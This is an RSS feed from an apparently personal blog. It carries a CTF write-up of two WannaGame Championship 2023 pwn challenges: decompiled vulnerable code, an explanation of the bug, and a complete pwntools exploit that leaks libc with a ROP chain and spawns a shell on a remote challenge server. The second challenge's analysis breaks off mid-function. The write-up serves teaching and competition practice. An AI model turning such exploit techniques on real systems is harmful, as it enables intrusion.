<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Posts on w1n-gl0ry&#39;s</title>
    <link>https://w1n-gl0ry.github.io/posts/</link>
    <description>Recent content in Posts on w1n-gl0ry&#39;s</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Some copyright notice - [my license](https://example.com/license)</copyright>
    <lastBuildDate>Tue, 12 Dec 2023 17:37:11 +0800</lastBuildDate><atom:link href="https://w1n-gl0ry.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><icon>https://w1n-gl0ry.github.io/logo.svg</icon>
    
    
    <item>
      <title>0CTF/TCTF 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/0ctf-tctf2023/</link>
      <pubDate>Tue, 12 Dec 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/0ctf-tctf2023/</guid>
      <description><![CDATA[]]></description>
      
    </item>
    
    
    
    <item>
      <title>WannaGame ChampionShip 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/wc-2023/</link>
      <pubDate>Mon, 04 Dec 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/wc-2023/</guid>
      <description><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This past weekend, I played the WannaGame Championship CTF with my team 1337% Yogurt and we finished in the top 8 Global and top 2 in my University. Through this, I have managed to solve 2/2 pwn challenge <code>winner_of_all_time</code> and <code>serendipity</code>.</p>
<h1 id="1-winner-of-all-time">1. Winner of all time</h1>
<h2 id="overview">Overview</h2>
<p><img src="https://hackmd.io/_uploads/S10id2EIa.png" alt="image"></p>
<h2 id="analysis">Analysis</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7[<span style="color:#ae81ff">21</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> v3;
</span></span><span style="display:flex;"><span>  srand(v3);
</span></span><span style="display:flex;"><span>  magic <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">123456789</span>;
</span></span><span style="display:flex;"><span>  set_up(v4, a2);
</span></span><span style="display:flex;"><span>  banner();
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;What time do you want to be back?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Timeline number [%d]: &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)idc);
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> idc;
</span></span><span style="display:flex;"><span>    v7[v5] <span style="color:#f92672">=</span> get_int();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v7[idc] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">123456790</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;TVA: you commit the crime of time!!!&#34;</span>);
</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v7[idc] <span style="color:#f92672">==</span> magic )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>idc;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Welcome to sanctuary of time&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>v7</code> array has only 21 members, but the while loop doesn&rsquo;t break if the <code>idx</code> variable exceeds 21. This means we can easily create a ROP chain and use the predictable &lsquo;magic&rsquo; to break out of the while loop.</p>
<pre tabindex="0"><code>import ctypes
LIBC = ctypes.cdll.LoadLibrary(&#39;/path/to/dll&#39;)
LIBC.srand(LIBC.time(0))
</code></pre><p>I use this trick to bypass the check for the magic value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v7[idc] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">123456790</span> )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;TVA: you commit the crime of time!!!&#34;</span>);
</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Due to this check, it&rsquo;s not easy to create a normal rop chain with the large address in libc. So, I managed to leak libc and use <code>scanf(&quot;%lld&quot;, &lt;got_addr&gt;)</code> to get shell!!!</p>
<h2 id="exploit-script">Exploit script</h2>
<blockquote>
<p>solve.py</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./winner_of_all_time&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        init-pwndbg
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x0000000000401589
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;157.245.147.89&#39;</span>, <span style="color:#ae81ff">25174</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./winner_of_all_time&#39;</span>)        
</span></span><span style="display:flex;"><span>glibc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000401589</span>
</span></span><span style="display:flex;"><span>pop_rsi_r15<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000401596</span>
</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040101a</span>
</span></span><span style="display:flex;"><span>pop_rbp_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040133e</span>
</span></span><span style="display:flex;"><span>leave_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x00000000004013ac</span>
</span></span><span style="display:flex;"><span>glibc<span style="color:#f92672">.</span>srand(glibc<span style="color:#f92672">.</span>time(<span style="color:#66d9ef">None</span>))
</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> glibc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">123456789</span>
</span></span><span style="display:flex;"><span>print(magic)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">22</span>):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rbp<span style="color:#f92672">=</span><span style="color:#ae81ff">0x404b00</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(rbp)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add_nop_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040127c</span>
</span></span><span style="display:flex;"><span>mov_rbx<span style="color:#f92672">=</span><span style="color:#ae81ff">0x00000000004013a8</span>
</span></span><span style="display:flex;"><span>scanf<span style="color:#f92672">=</span><span style="color:#ae81ff">0x404060</span>
</span></span><span style="display:flex;"><span>d<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040270F</span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(d)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi_r15)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x404f00</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x000000000401180</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(d)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi_r15)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x404018</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x000000000401180</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x404f00</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(pl), <span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(u64(pl[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(magic)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; Welcome to sanctuary of time&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">=</span>u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>og<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1052fa</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin//sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="2-serendipity">2. Serendipity</h1>
<h2 id="overview-1">Overview</h2>
<p><img src="https://hackmd.io/_uploads/B1r_03VUa.png" alt="image"></p>
<p>Hmm, it&rsquo;s a 64 bits ELF file and has full protect, sound good to play with it.</p>
<h2 id="analysis-1">Analysis</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+4h] [rbp-ECh]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [rsp+8h] [rbp-E8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> j; <span style="color:#75715e">// [rsp+Ch] [rbp-E4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  pthread_t newthread; <span style="color:#75715e">// [rsp+10h] [rbp-E0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>addr; <span style="color:#75715e">// [rsp+18h] [rbp-D8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// [rsp+20h] [rbp-D0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  fd_set <span style="color:#f92672">*</span>p_readfds; <span style="color:#75715e">// [rsp+28h] [rbp-C8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf; <span style="color:#75715e">// [rsp+30h] [rbp-C0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ssize_t v11; <span style="color:#75715e">// [rsp+38h] [rbp-B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">timeval</span> timeout; <span style="color:#75715e">// [rsp+40h] [rbp-B0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> s; <span style="color:#75715e">// [rsp+50h] [rbp-A0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  fd_set readfds; <span style="color:#75715e">// [rsp+60h] [rbp-90h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v15; <span style="color:#75715e">// [rsp+E8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v15 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  pipe(p0);
</span></span><span style="display:flex;"><span>  pipe(p1);
</span></span><span style="display:flex;"><span>  pipe(p2);
</span></span><span style="display:flex;"><span>  pipe(p3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( pthread_mutex_init(<span style="color:#f92672">&amp;</span>mutex, <span style="color:#ae81ff">0LL</span>) <span style="color:#f92672">||</span> pthread_mutex_init(<span style="color:#f92672">&amp;</span>mutex2, <span style="color:#ae81ff">0LL</span>) )
</span></span><span style="display:flex;"><span>    error(<span style="color:#e6db74">&#34;pthread_mutex_init&#34;</span>);
</span></span><span style="display:flex;"><span>  pthread_create(<span style="color:#f92672">&amp;</span>newthread, <span style="color:#ae81ff">0LL</span>, session, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> socket(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    error(<span style="color:#e6db74">&#34;socket&#34;</span>);
</span></span><span style="display:flex;"><span>  memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(s));
</span></span><span style="display:flex;"><span>  s.sa_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)s.sa_data <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">0x26FDu</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>s.sa_data[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( bind(fd, <span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x10u</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    error(<span style="color:#e6db74">&#34;bind&#34;</span>);
</span></span><span style="display:flex;"><span>  addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x214uLL</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x100CuLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      p_readfds <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>readfds;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xF</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>        p_readfds<span style="color:#f92672">-&gt;</span>fds_bits[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      readfds.fds_bits[fd <span style="color:#f92672">/</span> <span style="color:#ae81ff">64</span>] <span style="color:#f92672">|=</span> <span style="color:#ae81ff">1LL</span> <span style="color:#f92672">&lt;&lt;</span> (fd <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>);
</span></span><span style="display:flex;"><span>      timeout.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>      timeout.tv_usec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( select(fd <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>readfds, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#f92672">&amp;</span>timeout) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        error(<span style="color:#e6db74">&#34;select&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( (readfds.fds_bits[fd <span style="color:#f92672">/</span> <span style="color:#ae81ff">64</span>] <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1LL</span> <span style="color:#f92672">&lt;&lt;</span> (fd <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>))) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    memset(addr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x214uLL</span>);
</span></span><span style="display:flex;"><span>    memset(v8, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100CuLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr[<span style="color:#ae81ff">1</span>].sa_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    v11 <span style="color:#f92672">=</span> recvfrom(fd, buf, <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">0</span>, addr, (socklen_t <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr[<span style="color:#ae81ff">1</span>].sa_family);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v11 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      error(<span style="color:#e6db74">&#34;recvfrom&#34;</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( j <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_22;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)buf <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    write(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>LABEL_22:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)check_data(addr, v8, buf) )
</span></span><span style="display:flex;"><span>      use_opcode(addr, v8);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>First, the server creates a connection using the UDP method that allows users to send packets to</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">session</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  time_t v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    pthread_mutex_lock(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_6100 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;=</span> qword_6108[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i] )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_6100 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
